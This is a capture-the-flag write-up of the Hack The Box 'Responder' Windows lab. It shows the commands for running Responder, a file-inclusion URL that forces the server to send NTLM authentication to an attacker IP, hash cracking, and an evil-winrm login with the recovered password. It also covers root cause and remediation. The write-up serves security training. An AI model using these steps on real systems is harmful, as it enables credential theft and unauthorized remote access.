
Machine Name : Responder
Platform : Hackthebox
difficulty : Very easy
target IP : 10.129.95.234

- Machine about : Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be used to get a terminal on the machine using the acquired credentials
### Enumeration : 
**nmap :**
![[Pasted image 20260721230221.png]]

| Port | State | Service | Version                                                |
| ---- | ----- | ------- | ------------------------------------------------------ |
| 80   | open  | http    | Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) |
| 5985 | open  | http    | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                |
**website enumeration :**
- open the website :
```
http://{target's IP}
```
website has redirected the browser to a new URL , 
```
http://unika.htb
```
the browser is unable to find the website.
- setting up a **local name-to-IP mapping**:
```
echo "{target's IP} unika.htb" | sudo tee -a /etc/hosts
```
![[Pasted image 20260721231024.png|533]]
now browser is reaching the correct name-based virtual host.

### Exploitation :

To get the credentials of the users : 
- setup **Responder** :
```
sudo responder -I tun0
```
Windows thinks:
> “There is an SMB server at that IP. I'll try connecting to it.”

But **something needs to actually be listening there and behave like an SMB server**.

That's where **Responder** comes in. Responder starts a malicious/rogue SMB service on your Kali machine and waits for authentication attempts.
![[Pasted image 20260722123743.png|433]]

- Exploits the vulnerable `page` parameter to force the target server to connect to our SMB server (Responder), causing it to send NTLM authentication that Responder captures as a **NetNTLMv2 hash**.
```
http://unika.htb/?page=//10.10.14.25/somefile
```
![[Pasted image 20260722132913.png]]

- output in the responder:
![[Pasted image 20260722134323.png]]
**Hash Cracking :**
- save it into a `.txt` file using `echo`.
![[Pasted image 20260722135335.png]]

- use **john the ripper** to crack the password for the Administrator account. 
![[Pasted image 20260722135233.png]]

**evil-winrm :**
We'll connect to the WinRM service on the target and try to get a session using evil-winrm.
```
evil-winrm -i {target ip} -u administrator -p badminton
```
![[Pasted image 20260722140816.png]]

- direct to the \user\mike\Desktop folder to find the flag.txt
![[Pasted image 20260722141711.png|469]]
### Risk Severity: Critical

The web application contained a File Inclusion vulnerability in the `page` parameter, which could be abused to force the target to authenticate to an attacker-controlled SMB server. This exposed **NetNTLMv2** authentication material that was successfully cracked, allowing valid credentials to be recovered and used to gain remote access through WinRM.

### Impact

Successful exploitation could allow an attacker to capture NTLM authentication material and perform offline password-cracking attacks. If the password is recovered, the compromised credentials could be used to access exposed services such as WinRM, execute commands remotely, and access sensitive files.

In this assessment, the recovered credentials successfully provided a remote PowerShell session on the target system.

### Root Cause

The primary cause was insufficient validation of user-controlled input in the vulnerable `page` parameter. The application accepted an external UNC path, causing the Windows server to initiate SMB authentication toward the attacker-controlled system.

The impact was increased by the use of a weak password that could be recovered through an offline dictionary attack.

### Evidence

The exploitation was confirmed through the following evidence:

- Responder successfully captured NetNTLMv2 authentication material after triggering the vulnerable `page` parameter.
- John the Ripper successfully recovered the account password.
- The recovered credentials successfully authenticated through WinRM using Evil-WinRM.
- A remote PowerShell session was established and the target filesystem, including `flag.txt`, was successfully accessed.

### Remediation

The application should strictly validate and restrict values supplied to the `page` parameter and prevent arbitrary external file paths from being processed. Unnecessary outbound SMB traffic should be blocked using firewall rules.

Strong passwords should also be enforced to reduce the risk of offline password cracking, and WinRM access should be restricted to trusted administrative hosts. NTLM authentication should be reduced or disabled where operationally possible.

### Conclusion

The target was successfully compromised by exploiting a File Inclusion vulnerability that caused the server to authenticate to an attacker-controlled SMB service. This allowed NetNTLMv2 authentication material to be captured and the associated weak password to be recovered through an offline dictionary attack.

The compromised credentials were subsequently used to authenticate through WinRM and establish a remote PowerShell session, resulting in unauthorized access to the target system and its files.